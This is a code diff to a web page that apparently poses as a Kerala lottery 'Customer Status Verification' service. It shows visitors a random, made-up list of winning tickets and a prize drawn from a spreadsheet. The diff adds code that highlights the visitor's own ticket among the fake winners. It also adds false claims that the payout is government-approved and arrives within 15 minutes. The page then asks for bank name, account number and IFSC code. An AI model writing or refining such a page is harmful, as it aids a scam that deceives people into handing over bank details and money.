@@ -6,21 +6,119 @@
   <title>Customer Status Verification</title>
   <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
   <style>
-    body { font-family: sans-serif; background: linear-gradient(135deg, #091921, #13334c, #1a506b); min-height: 100vh; margin: 0; padding: 15px; display: flex; flex-direction: column; align-items: center; color: #e2e8f0; }
-    .box { background: #0f2838; padding: 20px; border-radius: 12px; width: 100%; max-width: 420px; box-sizing: border-box; margin-bottom: 15px; box-shadow: 0 8px 25px rgba(0,0,0,0.5); border: 1px solid #1e4a66; }
+    body {
+      font-family: sans-serif;
+      background: linear-gradient(135deg, #091921, #13334c, #1a506b);
+      min-height: 100vh;
+      margin: 0;
+      padding: 15px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      color: #e2e8f0;
+    }
+    .box {
+      background: #0f2838;
+      padding: 20px;
+      border-radius: 12px;
+      width: 100%;
+      max-width: 420px;
+      box-sizing: border-box;
+      margin-bottom: 15px;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.5);
+      border: 1px solid #1e4a66;
+    }
     .text-center { text-align: center; }
-    .live-dot { width: 10px; height: 10px; background: #ff1744; border-radius: 50%; display: inline-block; box-shadow: 0 0 8px #ff1744; margin-right: 5px; }
-    input { width: 100%; padding: 11px; margin: 8px 0 14px; box-sizing: border-box; background: #091a26; border: 1px solid #295d80; border-radius: 6px; font-size: 14px; color: #38bdf8; outline: none; }
+    .live-dot {
+      width: 10px;
+      height: 10px;
+      background: #ff1744;
+      border-radius: 50%;
+      display: inline-block;
+      box-shadow: 0 0 8px #ff1744;
+      margin-right: 5px;
+    }
+    input {
+      width: 100%;
+      padding: 11px;
+      margin: 8px 0 14px;
+      box-sizing: border-box;
+      background: #091a26;
+      border: 1px solid #295d80;
+      border-radius: 6px;
+      font-size: 14px;
+      color: #38bdf8;
+      outline: none;
+    }
     input:focus { border-color: #38bdf8; }
-    button { width: 100%; padding: 12px; background: linear-gradient(135deg, #0284c7, #0369a1); color: #fff; border: none; border-radius: 6px; font-weight: bold; font-size: 15px; cursor: pointer; }
-    .btn-green { background: linear-gradient(135deg, #16a34a, #15803d); margin-top: 10px; }
-    .btn-back { background: transparent; color: #94a3b8; border: 1px solid #295d80; margin-top: 8px; }
-    .row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #1a3c52; font-size: 14px; }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: linear-gradient(135deg, #0284c7, #0369a1);
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      font-size: 15px;
+      cursor: pointer;
+    }
+    .btn-green {
+      background: linear-gradient(135deg, #16a34a, #15803d);
+      margin-top: 10px;
+    }
+    .btn-back {
+      background: transparent;
+      color: #94a3b8;
+      border: 1px solid #295d80;
+      margin-top: 8px;
+    }
+    .row {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 0;
+      border-bottom: 1px solid #1a3c52;
+      font-size: 14px;
+    }
     .row span { color: #94a3b8; }
     .val-text { color: #38bdf8; font-weight: bold; }
-    .badges { display: flex; flex-wrap: wrap; gap: 4px; max-height: 80px; overflow-y: auto; }
-    .badge { background: #081721; color: #38bdf8; padding: 2px 6px; border-radius: 4px; font-size: 11px; font-family: monospace; border: 1px solid #1b425b; }
-    .prize-card { background: #0a1f2d; border: 1px solid #183e57; border-radius: 6px; padding: 8px; margin-bottom: 6px; }
+    .badges {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 4px;
+      max-height: 80px;
+      overflow-y: auto;
+    }
+    .badge {
+      background: #081721;
+      color: #38bdf8;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 11px;
+      font-family: monospace;
+      border: 1px solid #1b425b;
+    }
+    .badge-highlight {
+      background: #261c04 !important;
+      color: #fbbf24 !important;
+      border: 1px solid #fbbf24 !important;
+      font-weight: bold;
+    }
+    .prize-card {
+      background: #0a1f2d;
+      border: 1px solid #183e57;
+      border-radius: 6px;
+      padding: 8px;
+      margin-bottom: 6px;
+    }
+    .notice-box {
+      background: #061c24;
+      border: 1px solid #0284c7;
+      padding: 10px;
+      border-radius: 6px;
+      margin: 12px 0 6px;
+      font-size: 13px;
+      line-height: 1.5;
+    }
   </style>
 </head>
 <body>
@@ -42,6 +140,7 @@
       <div class="row"><span>Ticket Number:</span><b id="winTicket" style="color: #38bdf8; font-family: monospace;"></b></div>
       <div class="row"><span>Customer Name:</span><b id="winName" class="val-text"></b></div>
       <div class="row"><span>Mobile Number:</span><b id="winMobile" class="val-text"></b></div>
+      <div class="row"><span>Prize Level:</span><b id="winLevel" style="color: #fbbf24;"></b></div>
       <div class="row"><span>Winning Prize:</span><b id="winPrize" style="color: #4ade80; font-size: 18px;"></b></div>
     </div>
     <button class="btn-green" onclick="showStep(3)">Withdraw Winning Amount</button>
@@ -65,15 +164,24 @@
   <div id="step4" class="box text-center" style="display: none; border-top: 4px solid #f59e0b;">
     <div style="font-size: 35px;">⏳</div>
     <h3 style="color: #fbbf24; margin: 5px 0;">Request Under Review</h3>
+    
     <div style="background: #091a26; padding: 12px; border-radius: 8px; border: 1px solid #854d0e; text-align: left; margin: 12px 0;">
       <div class="row"><span>Ticket Number:</span><b id="revTicket" style="color: #38bdf8; font-family: monospace;"></b></div>
       <div class="row"><span>Holder Name:</span><b id="revName" class="val-text"></b></div>
+      <div class="row"><span>Prize Level:</span><b id="revLevel" style="color: #fbbf24;"></b></div>
       <div class="row"><span>Bank:</span><b id="revBank" class="val-text"></b></div>
       <div class="row"><span>Account No:</span><b id="revAcc" style="letter-spacing: 1px; color: #38bdf8;"></b></div>
       <div class="row"><span>IFSC:</span><b id="revIfsc" class="val-text"></b></div>
       <div class="row"><span>Prize Amount:</span><b id="revPrize" style="color: #4ade80;"></b></div>
       <div class="row"><span>Status:</span><b style="color: #fbbf24;">Pending Approval</b></div>
     </div>
+
+    <!-- Notice -->
+    <div class="notice-box">
+      <div style="color: #4ade80; font-weight: bold; margin-bottom: 4px;">⚡ Amount will be credited into your account within 15 minutes.</div>
+      <div style="color: #38bdf8;">✔ Transfer will be Kerala State Government Approved.</div>
+    </div>
+
     <button class="btn-back" onclick="showStep(1)">← Check Another</button>
   </div>
 
@@ -84,33 +192,68 @@
   </div>
 
   <script>
-    setInterval(() => { document.getElementById('clock').textContent = '🕒 ' + new Date().toLocaleString('en-IN'); }, 1000);
+    setInterval(() => {
+      document.getElementById('clock').textContent = '🕒 ' + new Date().toLocaleString('en-IN');
+    }, 1000);
 
     const fullPrizes = [
-      ["1st Prize: ₹25 Crore", 1], ["2nd Prize: ₹10 Crore", 1], ["3rd Prize: ₹75 Lakh", 1],
-      ["4th Prize: ₹25 Lakh", 12], ["5th Prize: ₹12 Lakh", 16], ["6th Prize: ₹1 Lakh", 36],
-      ["7th Prize: ₹75,000", 99], ["8th Prize: ₹25,000", 120], ["9th Prize: ₹10,000", 179], ["10th Prize: ₹2,500", 200]
+      ["1st Prize: ₹25 Crore", 1],
+      ["2nd Prize: ₹10 Crore", 1],
+      ["3rd Prize: ₹75 Lakh", 1],
+      ["4th Prize: ₹25 Lakh", 12],
+      ["5th Prize: ₹12 Lakh", 16],
+      ["6th Prize: ₹1 Lakh", 36],
+      ["7th Prize: ₹75,000", 99],
+      ["8th Prize: ₹25,000", 120],
+      ["9th Prize: ₹10,000", 179],
+      ["10th Prize: ₹2,500", 200]
     ];
-    let winHtml = "";
-    fullPrizes.forEach(p => {
-      let b = "";
-      for (let i = 0; i < p[1]; i++) b += `<span class="badge">KL ${Math.floor(100000 + Math.random() * 900000)}</span>`;
-      winHtml += `<div class="prize-card"><div class="row" style="border-bottom:none; padding: 2px 0;"><b style="color:#38bdf8;">${p[0]}</b><span style="color:#94a3b8;">(${p[1]})</span></div><div class="badges">${b}</div></div>`;
-    });
-    document.getElementById("winnersList").innerHTML = winHtml;
+
+    function renderWinners(matchedTicket = null, matchedLevel = null) {
+      let winHtml = "";
+      fullPrizes.forEach((p, idx) => {
+        let b = "";
+        const rank = idx + 1;
+        let isLevelMatch = false;
+
+        if (matchedLevel) {
+          const lvl = matchedLevel.toLowerCase();
+          if (lvl.includes(rank + "st") || lvl.includes(rank + "nd") || lvl.includes(rank + "rd") || lvl.includes(rank + "th") || lvl.includes(String(rank))) {
+            isLevelMatch = true;
+          }
+        }
+
+        for (let i = 0; i < p[1]; i++) {
+          if (isLevelMatch && i === 0 && matchedTicket) {
+            b += `<span class="badge badge-highlight">${matchedTicket} ⭐</span>`;
+          } else {
+            b += `<span class="badge">KL ${Math.floor(100000 + Math.random() * 900000)}</span>`;
+          }
+        }
+        winHtml += `<div class="prize-card"><div class="row" style="border-bottom:none; padding: 2px 0;"><b style="color:#38bdf8;">${p[0]}</b><span style="color:#94a3b8;">(${p[1]})</span></div><div class="badges">${b}</div></div>`;
+      });
+      document.getElementById("winnersList").innerHTML = winHtml;
+    }
+
+    renderWinners();
 
     function showStep(n) {
-      ['step1','step2','step3','step4'].forEach((id, i) => { document.getElementById(id).style.display = (i + 1 === n) ? 'block' : 'none'; });
+      ['step1', 'step2', 'step3', 'step4'].forEach((id, i) => {
+        document.getElementById(id).style.display = (i + 1 === n) ? 'block' : 'none';
+      });
       window.scrollTo({ top: 0, behavior: 'smooth' });
     }
 
     let curData = {};
+
     async function checkResult() {
       const q = document.getElementById("userInput").value.trim().toLowerCase();
       const msg = document.getElementById("msg");
-      if (!q) { msg.textContent = "Please enter ticket/mobile number."; return; }
+      if (!q) {
+        msg.textContent = "Please enter ticket/mobile number.";
+        return;
+      }
       msg.textContent = "Searching...";
-
       try {
         const res = await fetch("https://sheetdb.io/api/v1/u2lswkzde626d");
         const data = await res.json();
@@ -118,18 +261,27 @@
 
         if (record) {
           msg.textContent = "";
+
+          const rawMobile = String(record.mobile || record.Mobile || q).trim();
+          const maskedMobile = rawMobile.length > 4 ? "******" + rawMobile.slice(-4) : rawMobile;
+
           curData = {
             ticket: record.ticket || record.Ticket || record.ticket_no || ("KL " + Math.floor(100000 + Math.random() * 900000)),
             name: record.name || record.Name || "Customer",
-            mobile: record.mobile || record.Mobile || q,
+            mobile: maskedMobile,
+            level: record.level || record.Level || record.prize_level || "1st Prize",
             prize: record.amount || record.Amount || "₹25,00,000"
           };
+
           if (!curData.prize.includes("₹")) curData.prize = "₹" + curData.prize;
 
           document.getElementById("winTicket").textContent = curData.ticket;
           document.getElementById("winName").textContent = curData.name;
           document.getElementById("winMobile").textContent = curData.mobile;
+          document.getElementById("winLevel").textContent = curData.level;
           document.getElementById("winPrize").textContent = curData.prize;
+
+          renderWinners(curData.ticket, curData.level);
 
           showStep(2);
           confetti({ particleCount: 70, spread: 60, origin: { y: 0.6 } });
@@ -146,10 +298,14 @@
       const acc = document.getElementById("bankAcc").value.trim();
       const ifsc = document.getElementById("bankIfsc").value.trim().toUpperCase();
 
-      if (!bank || !acc || !ifsc) { alert("Please fill all details."); return; }
+      if (!bank || !acc || !ifsc) {
+        alert("Please fill all details.");
+        return;
+      }
 
       document.getElementById("revTicket").textContent = curData.ticket || "-";
       document.getElementById("revName").textContent = curData.name || "-";
+      document.getElementById("revLevel").textContent = curData.level || "-";
       document.getElementById("revBank").textContent = bank;
       document.getElementById("revAcc").textContent = acc.length > 4 ? "XXXX-XXXX-" + acc.slice(-4) : acc;
       document.getElementById("revIfsc").textContent = ifsc;
